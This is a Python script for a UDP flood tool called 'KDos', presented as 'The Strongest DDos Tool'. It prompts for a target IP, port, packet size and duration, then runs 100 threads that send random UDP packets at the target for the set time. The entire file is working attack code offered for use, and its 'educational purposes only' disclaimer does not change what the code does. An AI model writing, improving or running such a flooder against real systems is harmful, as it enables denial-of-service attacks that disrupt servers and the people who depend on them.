import socket
import threading
import random
import signal
import sys

# ANSI color codes
RED = '\033[91m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BLUE = '\033[94m'
RESET = '\033[0m'
YELLOW = '\033[93m'

# Banner
def banner():
    print(f"{RED}                   ██╗  ██╗██████╗  ██████╗ ███████╗")
    print(f"                   ██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝")
    print(f"                   █████╔╝ ██████╔╝██║  ███╗███████╗")
    print(f"                   ██╔═██╗ ██╔══██╗██║   ██║╚════██║")
    print(f"                   ██║  ██╗██║  ██║╚██████╔╝███████║")
    print(f"                   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝")
    print(f"{WHITE}============================================================================")
    print(f"{CYAN}[---]               The Strongest DDos Tool (KDos)              [---]")
    print(f"{CYAN}[---]                Created by: AKA_Sla7er (AKA)               [---]")
    print(f"{CYAN}[---]                      Version: 1.0.0                       [---]")
    print(f"{CYAN}[---]             Homepage: https://aka7-org.github.io/home/    [---]")
    print(f"{CYAN}                       Welcome to the KDos Tool (KDos){RESET}")

# Custom exit message on Ctrl + C
def handle_exit(signal, frame):
    print("")
    print(f"\n{RESET}Thank you For {RESET}{RED}Hacking{RED}{RESET} with KDos{RESET}")
    print(f"\n{RESET}Remember! Use KDos tool for {RESET}{RED}educational purposes{RED}{RESET} only!{RESET}")
    sys.exit(0)

# DDoS attack function
def ddos_attack(target_ip, target_port, packet_size, duration):
    # Packet to send
    packet = random._urandom(packet_size)
    timeout = threading.Event()

    def attack():
        while not timeout.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet, (target_ip, target_port))
                print(f"{RESET}Packet sent to {RESET}{CYAN}{target_ip}:{target_port}{CYAN}")
            except Exception as e:
                print(f"{RED}Error sending packet: {e}{RED}")

    # Launch threads for the attack
    threads = []
    for i in range(100):  # 100 threads for the attack
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # Run attack for the specified duration
    timeout.wait(duration)

    # Stop all threads after the duration
    timeout.set()
    for thread in threads:
        thread.join()

# Main function to run the DDoS tool
def main(): 
    signal.signal(signal.SIGINT, handle_exit)  # Capture Ctrl + C")
    banner()

    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    packet_size = int(input("Enter packet size (bytes): "))
    duration = int(input("Enter duration of attack (seconds): "))

    # Blue [ * ] in the launch message
    print(f"{BLUE}[ * ]{RESET} Launching attack on {RESET}{CYAN}{target_ip}:{target_port}{CYAN}{RESET} for {duration} seconds...")
    ddos_attack(target_ip, target_port, packet_size, duration)

if __name__ == "__main__":
    main()
